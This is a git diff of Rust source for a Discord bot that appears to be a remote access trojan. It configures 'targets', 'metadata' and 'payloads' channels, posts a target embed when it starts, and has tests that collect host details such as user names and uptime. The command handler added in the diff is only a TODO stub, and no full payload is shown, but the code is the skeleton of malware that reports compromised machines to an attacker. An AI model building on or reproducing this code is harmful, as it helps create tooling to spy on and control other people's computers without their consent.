@@ -12,16 +12,7 @@ use commands::{
     owner::*
 };
 
-use std::borrow::Borrow;
-use std::process::exit;
-use std::collections::{HashSet, HashMap};
-use std::sync::Arc;
-
-use serenity::model::permissions::Permissions;
-use serenity::model::prelude::interaction::Interaction;
-use serenity::model::prelude::command::CommandType;
 use serenity::framework::standard::DispatchError;
-use serenity::model::application::command::Command;
 use serenity::json::{Value, json};
 use serenity::model::{
     prelude::Activity,
@@ -30,16 +21,12 @@ use serenity::model::{
 use serenity::{async_trait, http};
 use serenity::framework::StandardFramework;
 use serenity::framework::standard::macros::*;
-use serenity::http::Http;
 use serenity::model::{
     channel::{Message, Channel},
     gateway::Ready,
-    webhook::Webhook,
     id::UserId,
 };
 use serenity::prelude::*;
-use serenity::builder::{self, CreateApplicationCommand};
-
 use sysinfo::{System, SystemExt, UserExt, *};
 
 struct Handler;
@@ -56,23 +43,18 @@ impl EventHandler for Handler {
         );
     }
 
-    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
-        if let Interaction::ApplicationCommand(command) = interaction {
-            match command.data.name.as_str() {
-                "WEEEEEE" => {println!(" {} SLASH command interaction", Pr::event());},
-                _ => {}
-            }
-        }
-    }
-
     // Set a handler for the `message` event - so that whenever a new message
     // is received - the closure (or function) passed will be called.
     //
     // Event handlers are dispatched through a threadpool, and so multiple
     // events can be dispatched simultaneously.
-    async fn message(&self, ctx: Context, msg: Message) {
-        
-    
+    async fn message(&self, ctx: Context, mut msg: Message) {
+        let rat_config = RatConfig::new(TARGETS_CHANNEL_ID, METADATA_CHANNEL_ID, PAYLOADS_CHANNEL_ID);
+        if msg.content.starts_with(BOT_PREFIX) {
+            msg.content = msg.content.trim_start_matches(BOT_PREFIX).to_string();
+                
+            // TODO
+        }
     }
 
     // Set a handler to be called on the `ready` event. This is called when a
@@ -92,7 +74,9 @@ impl EventHandler for Handler {
         ).await;
 
         let rat_config = RatConfig::new(TARGETS_CHANNEL_ID, METADATA_CHANNEL_ID, PAYLOADS_CHANNEL_ID);
+        let embed = target_embed().await;
         rat_config.config_targets_channel(&ctx).await;
+        rat_config.send_target_embed(&ctx).await;
 
         // print that the bot is now online and ready to use
         println!(" {} {} is connected!", Pr::bot(), ready.user.tag());
@@ -182,6 +166,7 @@ async fn error_handler(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::collections::HashMap;
 
     // #[test]
     fn get_ip() {
@@ -200,19 +185,14 @@ mod tests {
     }
 
     #[test]
-    fn concat_users() {
+    fn sys_info() {
         let system = System::new_all();
-        let user_str = system.users()
-            .into_iter()
-            .map(|i| i.name())
-            .collect::<Vec<&str>>()
-            .join(" ");
+        let test = system.uptime();
 
-        println!(" : {:?}", user_str);
-        println!(" : {:?}", system.users());
+        println!(" : {:?}", test);
     }
 
-    #[test]
+    // #[test]
     fn prefix_msgs() {
         println!(" {} Couldn't start bot :(", Pr::app());
         println!(" {} Couldn't start bot :(", Pr::bot());
